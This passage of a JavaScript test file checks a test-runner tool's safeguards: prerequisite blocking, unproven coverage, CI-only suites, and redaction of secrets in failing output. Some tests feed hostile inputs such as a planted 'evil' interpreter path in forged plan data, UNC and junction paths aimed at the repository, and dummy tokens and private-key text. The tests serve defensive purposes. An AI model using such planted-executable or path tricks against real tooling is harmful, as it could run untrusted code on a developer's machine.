  const r = (await runPlan(previewPlan(one('repo.feature_flag_registry'), { root: FAKE, fsx: all }), { root: FAKE, fsx: all, executor, getTreeDigest: () => 'T', parentEnv: {} })).results[0]
  assert.equal(r.status, RESULT.NO_TESTS)
})

test('REVIEW: more token formats are redacted and a failing step keeps a sanitized tail', () => {
  const t = sanitizeOutput('sb_secret_abcdefghijklmnop1234 sb_publishable_abcdefghijklmnop1234 npm_abcdefghijklmnopqrstuvwxyz0123456789', {})
  for (const x of ['sb_secret_abc', 'sb_publishable_abc', 'npm_abcdef']) assert.ok(!t.includes(x), x)
  const sel = select('apps/web/lib/a.ts'); const run = { results: [{ suite_id: 'web.lint', status: RESULT.FAILED, steps: [{ label: 'x', status: RESULT.FAILED, output: 'lint error at a.ts\n'.repeat(300) }] }], request_problems: [], tree_digest_start: 'T', tree_digest_end: 'T' }
  const step = rep(run, sel).outcomes[0].steps[0]; assert.ok(step.output_tail.length <= 2000 && !('output' in step))
})

test('REVIEW: the exit status is 3 (incomplete) when nothing was proven, 1 on failure', async () => {
  const { root, base } = mkRepo(); writeFileSync(path.join(root, 'apps/web/lib/new.ts'), 'n\n')
  assert.equal((await main(['run', '--base', base, '--root', root, '--execute'])).code, 3)
})

// ── Final validation round: findings A–E ──
const noDotenv = { exists: (p) => !/[\\/]\.env$/.test(p) }
const noVenv = { exists: (p) => !/[\\/]\.env$/.test(p) && !/\.venv/.test(p) }

test('FINAL-prereq: web.feature_flag_scripts imports @supabase/supabase-js, so it is a PREREQ suite — BLOCKED without web node_modules, never a bare failure and never an install', async () => {
  const s = SUITE_BY_ID['web.feature_flag_scripts']; assert.equal(s.tier, 'prereq'); assert.equal(s.requires.deps, 'web')
  const noModules = { exists: (p) => !/node_modules/.test(p) }
  const r = resolveSuite('web.feature_flag_scripts', { root: FAKE, fsx: noModules }); assert.equal(r.ok, false); assert.equal(r.blocked.code, 'PREREQ.NODE_MODULES'); assert.match(r.blocked.reason, /never installed automatically/)
  const executor = spy(); const plan = previewPlan(one('web.feature_flag_scripts', { tier: 'prereq' }), { root: FAKE, fsx: noModules })
  const run = await runPlan(plan, { root: FAKE, fsx: noModules, executor, getTreeDigest: () => 'T', parentEnv: {} })
  assert.equal(executor.calls.length, 0, 'nothing is spawned without the installed dependencies'); assert.equal(run.results[0].status, RESULT.BLOCKED); assert.equal(run.results[0].code, 'PREREQ.NODE_MODULES')
  assert.equal(resolveSuite('web.feature_flag_scripts', { root: FAKE, fsx: all }).ok, true, 'with dependencies present it resolves to an allowlisted node --test command')
  assert.equal(select('apps/web/scripts/x.mjs').suites.find((x) => x.id === 'web.feature_flag_scripts').local_action, 'RUN_WITH_PREREQS')
})

test('FINAL-C: the Python interpreter never comes from plan / selection / report data — only from the human option or the API virtualenv', async () => {
  const evil = path.join(FAKE, 'evil', 'python.exe')
  const sel = { python: evil, suites: [{ id: 'api.smoke', tier: 'prereq', python: evil, params: { python: evil }, argv: [evil, '-c', 'x'] }] }
  const plan = previewPlan(sel, { root: FAKE, fsx: noVenv })
  assert.ok(!JSON.stringify(plan.entries).includes('evil'), 'the preview does not even echo an interpreter'); assert.ok(!plan.entries.some((e) => 'python' in e))
  assert.equal(plan.entries[0].action, 'BLOCKED'); assert.equal(plan.entries[0].code, 'PREREQ.PYTHON_ENV')
  const forged = { request_problems: [], python: evil, entries: [{ suite_id: 'api.smoke', tier: 'prereq', action: 'WILL_RUN', python: evil, params: { python: evil }, resolved: { steps: [{ argv: [evil, '-c', 'x'], cwd: FAKE, env_profile: 'node', timeout_ms: 5 }] } }] }
  const executor = spy(); const r = await runPlan(forged, { root: FAKE, fsx: noVenv, executor, getTreeDigest: () => 'T', parentEnv: {} })
  assert.equal(executor.calls.length, 0, 'a planted interpreter is never executed'); assert.equal(r.results[0].code, 'PREREQ.PYTHON_ENV')
  // the one human-supplied option: absolute, python-named, not UNC, not inside the repository (except the API venv itself)
  const argv0 = (py) => { const x = resolveSuite('api.smoke', { root: FAKE, fsx: noDotenv, python: py }); return x.ok ? x.steps[0].argv[0] : x.blocked.code }
  const trusted = path.resolve(os.tmpdir(), 'dhv2-trusted-py', 'python.exe'); assert.equal(argv0(trusted), trusted)
  const venvPy = path.join(FAKE, 'apps/api/.venv/Scripts/python.exe'); assert.equal(argv0(venvPy), venvPy)
  for (const bad of [path.join(FAKE, 'python.exe'), path.join(FAKE, 'tools', 'python3'), path.join(FAKE, 'apps/api/python.exe'), path.join(FAKE, 'apps/api/.venv-evil/python.exe'), 'python', 'python.exe', '../python.exe', '\\\\host\\share\\python.exe', path.resolve(os.tmpdir(), 'x', 'node.exe'), `${trusted}\n`, '', 5, {}, ['python']]) assert.equal(argv0(bad), 'PREREQ.PYTHON_ENV', `accepted ${JSON.stringify(bad)}`)
  assert.equal(argv0(null), argv0(undefined), 'no option falls back to the venv candidates only')
})

test('FINAL-D: a clean tree with no verified comparison base is UNPROVEN end to end (collection, selection, evidence, CLI) — never "no changes" and never a pass', async () => {
  const { root, base } = mkRepo()
  const noBase = collectChanges(root); assert.equal(noBase.ok, true); assert.equal(noBase.entries.length, 0); assert.equal(noBase.base_examined, false)
  const sel = selectTests(noBase); assert.equal(sel.coverage.status, 'COVERAGE.UNPROVEN'); assert.notEqual(sel.status, 'NO_CHANGES'); assert.ok(sel.coverage.gaps.some((g) => g.code === 'CHANGES.NO_BASE'))
  const lw = { ...sel, suites: sel.suites.filter((s) => s.local_action === 'RUN' || s.local_action === 'CI_ONLY') }
  const e = rep(passRun(lw), lw, { head_sha: noBase.head_sha, tree_digest: 'T', changed_file_digest: noBase.changed_file_digest, task_id: null, branch: 'b', base_sha: null, phase5_scope_digest: null, task_checkpoint: 'not_consulted' }).evidence
  assert.equal(e.eligible, false); assert.ok(e.reasons.includes('COVERAGE.UNPROVEN'), 'every suite "passing" still cannot prove an unexamined diff')
  const out = JSON.parse((await main(['plan', '--root', root, '--format', 'json'])).out); assert.equal(out.selection.coverage.status, 'COVERAGE.UNPROVEN'); assert.equal(out.evidence.eligible, false)
  const run = await main(['run', '--root', root, '--execute'], { write: false }); assert.notEqual(run.code, 0, 'an unproven clean-tree run is never a success exit')
  // with a verified base the same clean tree is a proven, explicit "no changes detected"
  // base == HEAD examines no committed work, so it is NOT a verified base: clean => UNPROVEN, and a dirty tree with committed branch work is UNPROVEN too
  for (const same of [base, 'HEAD']) { const c = collectChanges(root, { base: same }); assert.equal(c.base_examined, false); assert.equal(selectTests(c).coverage.status, 'COVERAGE.UNPROVEN', same) }
  writeFileSync(path.join(root, 'apps/web/lib/b.ts'), 'b\n'); G(root, 'add', '-A'); G(root, 'commit', '-q', '-m', 'branch work'); const head2 = G(root, 'rev-parse', 'HEAD'); writeFileSync(path.join(root, 'apps/web/lib/c.ts'), 'c\n')
  const narrow = collectChanges(root, { base: head2 }); assert.equal(narrow.base_is_head, true); assert.ok(!narrow.all_paths.includes('apps/web/lib/b.ts'), 'committed work is invisible against base==HEAD...'); assert.equal(selectTests(narrow).coverage.status, 'COVERAGE.UNPROVEN', '...so it must never be called proven')
  const real = collectChanges(root, { base }); assert.equal(real.base_examined, true); assert.ok(real.all_paths.includes('apps/web/lib/b.ts')); assert.notEqual(selectTests(real).coverage.status, 'COVERAGE.UNPROVEN')
  rmSync(path.join(root, 'apps/web/lib/c.ts')); G(root, 'commit', '-q', '--allow-empty', '-m', 'empty'); const empty = collectChanges(root, { base: head2 }); assert.equal(empty.base_examined, true)
  assert.equal(selectTests(empty).coverage.status, 'NO_CHANGES_DETECTED'); assert.equal(selectTests(empty).status, 'NO_CHANGES')
  for (const badBase of ['no-such-ref', 'HEAD~99', '-x', 'a b']) { const c = collectChanges(root, { base: badBase }); assert.equal(c.ok, false, badBase); assert.equal(selectTests(c).coverage.status, 'COVERAGE.UNPROVEN', badBase) }
})

test('FINAL-B: CI-only and permanently blocked suites are REQUIRED coverage — listed, never executed, never passing here', async () => {
  const sel = select('apps/api/routers/tasks.py'); const ciOnly = sel.suites.filter((s) => s.tier === 'ci_only').map((s) => s.id); assert.ok(ciOnly.length >= 5)
  const executor = spy(); const plan = previewPlan(sel, { root: FAKE, fsx: noDotenv })
  const preview = buildReport({ selection: sel, plan, run: null, identity: { head_sha: 'h', tree_digest: 'T' } })
  for (const id of [...ciOnly, 'db.api_integration']) assert.ok(preview.ci_required_suites.includes(id), `preview omits ${id}`)
  const run = await runPlan(plan, { root: FAKE, fsx: noDotenv, executor, getTreeDigest: () => 'T', parentEnv: {} })
  const plannedSteps = plan.entries.filter((e) => e.action === 'WILL_RUN').reduce((n, e) => n + e.resolved.steps.length, 0)
  assert.ok(executor.calls.length > 0 && executor.calls.length <= plannedSteps, 'only the steps of WILL_RUN suites reach the executor'); for (const c of executor.calls) assert.ok(['node', 'python', 'python3'].includes(path.basename(c.argv[0]).replace(/\.exe$/i, '')), c.argv[0])
  const report = rep(run, sel)
  for (const id of ciOnly) { const o = report.outcomes.find((x) => x.suite_id === id); assert.equal(o.status, RESULT.NOT_RUN, id); assert.equal(o.code, 'CI.ONLY', id); assert.ok(!report.summary.passed.includes(id) && !report.summary.failed.includes(id), `${id} reported as locally executed`); assert.ok(report.ci_required_suites.includes(id), id) }
  assert.equal(report.outcomes.find((x) => x.suite_id === 'db.api_integration').status, RESULT.BLOCKED); assert.ok(!report.summary.passed.includes('db.api_integration'))
  const text = renderText(report); assert.match(text, /CI-required suites \(never run or passed by this tool/); for (const id of ciOnly) assert.ok(text.includes(id), `${id} missing from the text report`)
  // a PASS candidate lists them as ci_required and is never claimed CI-equivalent
  const lw = selectTests(changeSetFromEntries(['docs/GUIDE.md'], { base_examined: true })); const lwLocal = { ...lw, suites: lw.suites.filter((s) => s.local_action === 'RUN' || s.local_action === 'CI_ONLY') }
  const good = rep(passRun(lwLocal), lwLocal); assert.equal(good.evidence.result, 'pass'); assert.deepEqual([...good.evidence.ci_required].sort(), [...good.ci_required_suites].sort()); assert.equal(good.ci_equivalent, false)
  // a "passing" outcome forged onto a CI-only suite can never be produced by runPlan, and is not offered as local evidence
  const forgedRun = passRun(lwLocal); forgedRun.results.find((x) => x.suite_id === 'ci.security_scan').status = RESULT.PASSED; const fr = rep(forgedRun, lwLocal)
  assert.ok(fr.ci_required_suites.includes('ci.security_scan')); assert.ok(!fr.summary.passed.includes('ci.security_scan')); assert.equal(fr.outcomes.find((x) => x.suite_id === 'ci.security_scan').code, 'CI.RESULT_IGNORED')
  assert.ok(!/ci\.security_scan/.test(fr.evidence.summary ?? '') && fr.evidence.result === 'pass' && !fr.summary.passed.includes('ci.security_scan'))
  const forgedFail = passRun(lwLocal); forgedFail.results.find((x) => x.suite_id === 'ci.pixel_diff').status = RESULT.FAILED; assert.equal(rep(forgedFail, lwLocal).evidence.result, 'fail', 'a claimed failure is never discarded (fail closed); only a claimed PASS on a CI-required suite is ignored')
})

test('FINAL-E: a failing command\'s output is sanitized in BOTH head and tail; cut points and chunk boundaries cannot leak a secret', async () => {
  const SH = `ghp_${'H'.repeat(36)}`; const ST = `ghp_${'T'.repeat(36)}`; const LIT = 'real-token-value-0123456789'
  const script = `process.stdout.write('HEAD ${SH} ${LIT}\\n');process.stdout.write('x'.repeat(${LIMITS.maxOutputBytes * 2}));process.stderr.write('\\nTAIL ${ST} ${LIT}\\n');process.exitCode=1`
  const r = await spawnStep({ argv: [process.execPath, '-e', script], cwd: os.tmpdir(), env: buildEnv('node').env, timeout_ms: 30000 }, { parentEnv: { GITHUB_TOKEN: LIT } })
  assert.equal(r.status, RESULT.FAILED); assert.equal(r.exit_code, 1)
  assert.match(r.output, /HEAD /); assert.match(r.output, /TAIL /); assert.match(r.output, /middle of output omitted: \d+ bytes/); assert.ok(r.output_bytes > LIMITS.maxOutputBytes)
  for (const secret of [SH, ST, LIT, 'HHHHHHHHHH', 'TTTTTTTTTT']) assert.ok(!r.output.includes(secret), `leaked ${secret.slice(0, 12)}`)
  assert.ok(Buffer.byteLength(r.output) <= LIMITS.maxOutputBytes + 500)
  const report = rep({ results: [{ suite_id: 'web.lint', status: RESULT.FAILED, steps: [{ label: 'x', status: RESULT.FAILED, output: r.output }] }], request_problems: [], tree_digest_start: 'T', tree_digest_end: 'T' }, select('apps/web/lib/a.ts'))
  const step = report.outcomes[0].steps[0]; assert.ok(!('output' in step)); assert.match(step.output_head, /HEAD /); assert.match(step.output_tail, /TAIL /); assert.ok(step.output_head.length <= 1000 && step.output_tail.length <= 2000)
  for (const secret of [SH, ST, LIT]) assert.ok(!JSON.stringify(report).includes(secret), `report leaked ${secret.slice(0, 12)}`)
  const quiet = rep({ results: [{ suite_id: 'web.lint', status: RESULT.FAILED, steps: [{ label: 'x', status: RESULT.FAILED, output: 'short failure' }] }], request_problems: [], tree_digest_start: 'T', tree_digest_end: 'T' }, select('apps/web/lib/a.ts')).outcomes[0].steps[0]
  assert.ok(!('output_head' in quiet) && quiet.output_tail === 'short failure', 'a short output is kept once, not duplicated')
})

test('FINAL-E: assembleOutput — contiguous chunks are sanitized as ONE text; a dropped middle is stated and the partial word at each cut is removed', () => {
  const buf = (s) => Buffer.from(s); const secret = `ghp_${'Z'.repeat(36)}`
  const a = assembleOutput({ head: [buf(`start ${secret.slice(0, 14)}`)], tail: [buf(`${secret.slice(14)} end`)], total: Buffer.byteLength(`start ${secret} end`) }, {})
  assert.ok(!a.output.includes('ZZZZ') && a.output.includes('[REDACTED]') && !/omitted/.test(a.output), 'a secret straddling a chunk boundary is redacted and nothing is claimed omitted'); assert.equal(a.dropped_bytes, 0)
  const cut = assembleOutput({ head: [buf('line1\nsk_live_ABCDEFGH')], tail: [buf('IJKLMNOP1234 rest\nEND')], total: 500000 }, {})
  for (const leak of ['sk_live_ABCDEFGH', 'IJKLMNOP1234']) assert.ok(!cut.output.includes(leak), `cut point leaked ${leak}`)
  assert.ok(cut.output.includes('line1') && cut.output.includes('END') && cut.dropped_bytes > 0); assert.match(cut.output, /middle of output omitted: 499\d{3} bytes/)
  assert.equal(assembleOutput({ head: [], tail: [], total: 0 }, {}).output, '')
  const longRun = assembleOutput({ head: [buf(`a\n${'y'.repeat(5000)}`)], tail: [buf(`${'z'.repeat(5000)}\nb`)], total: 900000 }, {})
  assert.ok(longRun.output.length > 9000, 'one very long unbroken line is trimmed at the cut, not erased'); assert.ok(longRun.output.startsWith('a\n') && longRun.output.endsWith('\nb'))
  assert.ok(!assembleOutput({ head: [buf('HOME=/x SUPABASE_SERVICE_ROLE_KEY=svc-role-key-0123456789\n')], tail: [buf('ok')], total: 9999 }, { SUPABASE_SERVICE_ROLE_KEY: 'svc-role-key-0123456789' }).output.includes('svc-role-key'))
})

test('REVIEW-M1: a PEM private key whose BEGIN is in the head and body/END in the tail is redacted across the dropped middle', () => {
  const body = Array.from({ length: 20 }, (_, i) => `MIIEvQIBADANBgkqhkiG9w0BAQEFAASC${String(i).padStart(4, '0')}ZZ`)
  const head = `log\n-----BEGIN PRIVATE KEY-----\n${body.slice(0, 5).join('\n')}\n`; const tail = `${body.slice(5).join('\n')}\n-----END PRIVATE KEY-----\nbye`
  const out = assembleOutput({ head: [Buffer.from(head)], tail: [Buffer.from(tail)], total: 999999 }, {}).output
  assert.ok(!/MIIEvQIBADAN/.test(out) && !/-----END/.test(out), 'no key material survives on either side of the cut'); assert.ok(out.startsWith('log') && out.endsWith('bye'))
  const ansi = assembleOutput({ head: [Buffer.from(head)], tail: [Buffer.from(tail.replace('END PRIVATE', 'END PRIVATE\u001b[0m').replace('\u001b[0m KEY', '\u001b[0m KEY'))], total: 999999 }, {}).output; assert.ok(!/MIIEvQIBADAN/.test(ansi), 'ANSI inside the END marker cannot defeat the redaction')
  const open = assembleOutput({ head: [Buffer.from(head)], tail: [Buffer.from(body.slice(5).join('\n'))], total: 999999 }, {}).output; assert.ok(!/MIIEvQIBADAN/.test(open), 'a key still open at the end of the output is redacted too')
  const plain = assembleOutput({ head: [Buffer.from('a\n')], tail: [Buffer.from('x\n-----END PRIVATE KEY-----\nbye')], total: 999999 }, {}).output; assert.ok(!plain.includes('-----END'), 'an END with no BEGIN in the tail is treated as the end of a cut key')
})

test('REVIEW-M2: a selected DB / not-automated suite makes a local PASS ineligible even when every runnable suite passed (fail closed)', () => {
  const sel = select({ path: 'supabase/migrations/900_x.sql', status: 'A' }); const permanent = sel.suites.filter((s) => s.blocked && /^(RUNNER\.NOT_AUTOMATED|DB_STACK\.)/.test(s.blocked.code)).map((s) => s.id); assert.ok(permanent.length >= 1)
  const run = { results: sel.suites.map((s) => ({ suite_id: s.id, status: s.tier === 'ci_only' || permanent.includes(s.id) ? RESULT.NOT_RUN : RESULT.PASSED, steps: [] })), request_problems: [], tree_digest_start: 'T', tree_digest_end: 'T', stopped: null }
  const ev = rep(run, sel).evidence; assert.equal(ev.eligible, false); for (const id of permanent) assert.ok(ev.reasons.includes(`CI_REQUIRED_NOT_RUNNABLE:${id}`), id)
  run.results.find((r) => r.status === RESULT.PASSED).status = RESULT.FAILED; assert.equal(rep(run, sel).evidence.result, 'fail', 'a FAIL is still offered so it can be recorded')
  const web = select('apps/web/components/A.tsx'); const wr = { ...passRun(web), results: web.suites.map((s) => ({ suite_id: s.id, status: ['RUN', 'RUN_WITH_PREREQS'].includes(s.local_action) ? RESULT.PASSED : RESULT.NOT_RUN, steps: [] })) }; assert.equal(rep(wr, web).evidence.eligible, false, 'web.build / web.hermetic never run here')
})

test('REVIEW-L1: --python spelled to reach the repository (trailing dot/space, symlink, junction) is refused', () => {
  const R = mkdtempSync(path.join(os.tmpdir(), 'dhv2-py-')); tmpDirs.push(R); const O = mkdtempSync(path.join(os.tmpdir(), 'dhv2-pyo-')); tmpDirs.push(O)
  writeFileSync(path.join(R, 'python.exe'), ''); writeFileSync(path.join(O, 'python.exe'), '')
  const argv0 = (py) => { const x = resolveSuite('api.smoke', { root: R, fsx: noDotenv, python: py }); return x.ok ? x.steps[0].argv[0] : x.blocked.code }
  assert.equal(argv0(path.join(O, 'python.exe')), path.join(O, 'python.exe'))
  assert.equal(argv0(`${R}.${path.sep}python.exe`), 'PREREQ.PYTHON_ENV'); assert.equal(argv0(`${R} ${path.sep}python.exe`), 'PREREQ.PYTHON_ENV'); assert.equal(argv0(path.join(R, 'python.exe')), 'PREREQ.PYTHON_ENV')
  try { symlinkSync(R, path.join(O, 'link'), 'junction'); assert.equal(argv0(path.join(O, 'link', 'python.exe')), 'PREREQ.PYTHON_ENV', 'a junction/symlink into the repository resolves to the repository') } catch (e) { if (!/EPERM|EACCES|ENOSYS/.test(String(e.code))) throw e }
})

test('REVIEW-L5/N1: secret redaction cannot be made quadratic, and ANSI sequences cannot split a token past the patterns', () => {
  const t0 = Date.now(); sanitizeOutput('TOKEN'.repeat(20000), {}); sanitizeOutput(`${'A'.repeat(100000)}`, {}); assert.ok(Date.now() - t0 < 1500, `redaction took ${Date.now() - t0} ms`)
  assert.ok(!sanitizeOutput(`ghp_${'A'.repeat(10)}\u001b[0m${'B'.repeat(30)}`, {}).includes('BBBB'), 'ANSI sequences are stripped before redaction')
  assert.match(sanitizeOutput('SUPABASE_SERVICE_ROLE_KEY=abcdefghijk', {}), /\[REDACTED\]/)
})
